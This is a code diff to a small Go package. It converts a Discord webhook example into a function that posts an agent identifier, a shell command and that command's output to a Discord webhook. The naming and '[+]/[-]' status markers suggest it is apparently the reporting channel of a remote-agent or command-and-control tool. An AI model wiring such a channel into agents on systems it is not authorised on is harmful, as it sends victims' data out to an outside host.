@@ -1,6 +1,4 @@
-// ChatGPT 4 generated
-
-package main
+package discord
 
 import (
 	"bytes"
@@ -15,11 +13,23 @@ type Message struct {
 	Content string `json:"content"`
 }
 
-func main() {
-	webhookURL := "" // Replace with your actual webhook URL
-	messageContent := "Hello Discord"
+const discordMaxLength = 2000
 
-	message := Message{Content: messageContent}
+func SendToDiscord(agentId string, command string, output string) {
+	webhookURL := os.Getenv("DISCORD_WEBHOOK_URL")
+	if webhookURL == "" {
+		fmt.Println("Error: DISCORD_WEBHOOK_URL environment variable not set")
+		os.Exit(1)
+	}
+
+	header := "[Agent: " + agentId + "]\n$ " + command + "\n```\n"
+	footer := "\n```"
+	maxOutput := discordMaxLength - len(header) - len(footer)
+	if len(output) > maxOutput {
+		output = output[:maxOutput]
+	}
+
+	message := Message{Content: header + output + footer}
 
 	// Convert the message struct to JSON
 	jsonData, err := json.Marshal(message)
@@ -38,8 +48,8 @@ func main() {
 
 	// Discord returns 204 No Content for a successful request
 	if resp.StatusCode == http.StatusNoContent {
-		fmt.Println("Message sent successfully!")
+		fmt.Println("[+] Message sent successfully!")
 	} else {
-		fmt.Println("Error: Received unexpected response status:", resp.Status)
+		fmt.Println("[-] Error: Received unexpected response status:", resp.Status)
 	}
 }
